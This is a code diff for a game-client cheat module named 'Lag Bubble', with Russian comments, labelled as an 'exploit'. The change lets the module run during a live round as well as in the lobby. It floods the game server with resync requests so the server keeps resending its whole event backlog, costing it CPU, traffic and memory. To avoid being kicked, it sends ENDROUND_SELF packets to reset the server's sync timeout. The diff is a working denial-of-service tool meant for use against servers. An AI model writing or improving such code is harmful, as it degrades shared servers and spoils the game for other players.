@@ -44,14 +44,15 @@ namespace CSHUB.Modules
         public override string Id   => "lag_bubble";
         public override string Name => "Lag Bubble";
         public override string Description =>
-            "«Все лагают, я нет».\n\n" +
-            "• Работает из ЛОББИ (не надо входить в раунд)\n" +
-            "• Заставляет сервер непрерывно пересылать тебе весь бэклог\n" +
-            "  событий раунда (CPU + трафик сервера) — ты молча дропаешь\n" +
-            "• Тебе почти ничего не стоит: в лобби нет симуляции\n" +
-            "• SyncTimeout-кик не приходит, пока ты не InGame (проверено\n" +
-            "  ServerEntityEventManager:280 — фильтр c.InGame)\n" +
-            "• НЕ работает если ты в игре (сначала выйди в лобби)";
+            "«Все лагают, я нет». Два режима:\n\n" +
+            "• ЛОББИ (безопасно): выйди из раунда, включи — сервер льёт\n" +
+            "  тебе весь бэклог вечно, кик по SyncTimeout невозможен\n" +
+            "• В РАУНДЕ (кульбит): окно ресинка 30-50с без кика\n" +
+            "  (MidRoundSyncTimeOut = max(события/10×интервал, 30с)):\n" +
+            "  мод сам успевает ENDROUND_SELF до истечения и открывает\n" +
+            "  новое окно — почти непрерывный поток, ты числишься в игре\n" +
+            "• Тебе почти ничего не стоит, серверу CPU+трафик+RAM";
+
         public override string Category => "exploit";
 
         // ---- настройки пульса ----
@@ -65,6 +66,7 @@ namespace CSHUB.Modules
         private static int _uiSession;
         private static int _sent;
         private static bool _running;
+        private static bool _waitingAfterEndRound;
 
         public override string GetLabel() => _running ? "Lag Bubble [ВКЛ]" : "Lag Bubble 🫧";
 
@@ -146,11 +148,7 @@ namespace CSHUB.Modules
                 }
                 else
                 {
-                    if (GameMain.Client.InGame)
-                    {
-                        Msg("сначала ВЫЙДИ в лобби (End round for me) — в раунде кик по SyncTimeout", Color.Orange);
-                        return true;
-                    }
+                    // InGame тоже ок: in-game кульбит (окно ресинка + ENDROUND-рефреш)
                     if (!float.TryParse((intervalBox.Text ?? "").Trim(), out _interval))
                     { _interval = DefaultInterval; }
                     _interval = Math.Clamp(_interval, MinInterval, MaxInterval);
@@ -213,27 +211,69 @@ namespace CSHUB.Modules
         private static IEnumerable<CoroutineStatus> PulseLoop(int session)
         {
             double next = 0.0;
+            // окно ресинка в раунде: max(события/10×интервал, 30с) — рефрешим
+            // ENDROUND_SELF-кульбитом сильно раньше истечения
+            double inGameWindow = 25.0;
+            double lastWindowStart = Timing.TotalTime;
+
             while (_running && session == _uiSession)
             {
                 yield return CoroutineStatus.Running;
                 if (Timing.TotalTime < next) { continue; }
-                next = Timing.TotalTime + _interval;
 
                 var c = GameMain.Client;
                 if (c == null) { yield break; }
-                if (c.InGame)
+
+                if (_waitingAfterEndRound)
                 {
-                    // вошли в раунд — глушим, чтобы не словить SyncTimeout-кик
-                    _running = false;
-                    _uiSession++;
-                    Msg("ты InGame — пульс остановлен (иначе кик по SyncTimeout)", Color.Orange);
-                    yield break;
+                    _waitingAfterEndRound = false;
+                    SendResyncRequest();
+                    _sent++;
+                    next = Timing.TotalTime + _interval;
+                    Msg("окно обновлено (ENDROUND + ресинк) — пакетов: " + _sent, Color.Cyan);
+                    UpdateStatus();
+                    continue;
                 }
 
-                SendResyncRequest();
+                if (!c.InGame)
+                {
+                    // ЛОББИ-режим: простой ресинк-запрос, кик невозможен
+                    next = Timing.TotalTime + _interval;
+                    SendResyncRequest();
+                    _sent++;
+                    UpdateStatus();
+                    continue;
+                }
+
+                // IN-GAME режим: следим за окном
+                if (Timing.TotalTime - lastWindowStart < inGameWindow)
+                {
+                    next = Timing.TotalTime + 1.0; // проверка окна раз в сек
+                    continue;
+                }
+
+                // окно на исходе: ENDROUND (InGame=false, кик-фильтры off) →
+                // сразу новый ресинк-запрос = новое окно. Пользователь мигнёт
+                // в лобби на долю секунды.
+                // ENDROUND сам по себе НЕ гарантирует мгновенную обработку сервером
+                // (пакет может встать в очередь) — посылаем ENDROUND, на след.
+                // итерации корутины (след. кадр) шлём ресинк-запрос.
+                SendEndRoundSelf();
                 _sent++;
+                _waitingAfterEndRound = true;
+                lastWindowStart = Timing.TotalTime;
+                next = Timing.TotalTime + 0.5; // пол-секунды на обработку
                 UpdateStatus();
             }
+        }
+
+        private static void SendEndRoundSelf()
+        {
+            var peer = GameMain.Client?.ClientPeer;
+            if (peer == null) { return; }
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.ENDROUND_SELF);
+            peer.Send(msg, DeliveryMethod.Unreliable);
         }
 
         // ---- пакеты ----
